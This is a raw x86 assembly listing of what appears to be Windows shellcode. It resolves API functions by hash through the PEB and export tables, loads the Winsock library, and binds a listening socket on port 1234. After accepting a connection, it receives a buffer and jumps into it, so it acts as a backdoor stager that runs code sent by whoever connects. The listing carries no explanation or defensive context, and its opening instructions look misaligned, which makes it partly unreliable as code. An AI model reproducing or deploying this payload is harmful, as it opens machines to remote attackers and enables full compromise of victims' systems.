```asm
_start:
    cld
    push -0x15
    inc edi
    call _start+2
    pushal
    xor ebx, ebx
    mov edi, dword ptr [ebp + 0x3c]
    mov edi, dword ptr [ebp + edi + 0x78]
    add edi, ebp
L_15:
    mov edx, dword ptr [edi + 0x20]
    add edx, ebp
    mov esi, dword ptr [edx + ebx*4]
    add esi, ebp
    xor eax, eax
    cdq
L_22:
    lodsb al, byte ptr [esi]
    ror edx, 0xd
    add edx, eax
    test al, al
    jne L_22
    inc ebx
    cmp dx, cx
    jne L_15
    dec ebx
    mov ecx, dword ptr [edi + 0x24]
    add ecx, ebp
    mov bx, word ptr [ecx + ebx*2]
    mov ecx, dword ptr [edi + 0x1c]
    add ecx, ebp
    add ebp, dword ptr [ecx + ebx*4]
    mov dword ptr [esp + 0x1c], ebp
    popal
    jmp eax
    xor ebx, ebx
    mov eax, dword ptr fs:[ebx + 0x30]
    mov eax, dword ptr [eax + 0xc]
    nop
    mov esi, dword ptr [eax + 0x1c]
    nop
    lodsd eax, dword ptr [esi]
    mov ebp, dword ptr [eax + 8]
    nop
    pop esi
    nop
    push bx
    push 0x3233
    push 0x5f327377
    nop
    push esp
    mov cx, 0x6072
    nop
    call esi
    xchg ebp, eax
    nop
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    inc ebx
    push ebx
    inc ebx
    push ebx
    mov edi, esp
    nop
    sub di, 0x208
    nop
    push edi
    push ebx
    mov cx, 0xdfe7
    call esi
    mov cx, 0x6fa8
    call esi
    xchg edi, eax
    nop
    push 0xd204
    push bx
    mov ecx, esp
    nop
    push 0x10
    push ecx
    push edi
    mov cx, 0x3b80
    call esi
    push ebx
    push edi
    mov cx, 0x4975
    call esi
    push esp
    push esp
    push esp
    push edi
    mov cx, 0x4c32
    call esi
    xchg edi, eax
    nop
    push eax
    mov cx, 0xce33
    call esi
    mov ecx, esp
    push eax
    mov ah, 0xc
    push eax
    push ecx
    push edi
    push ecx
    mov cx, 0x38c0
    jmp esi
```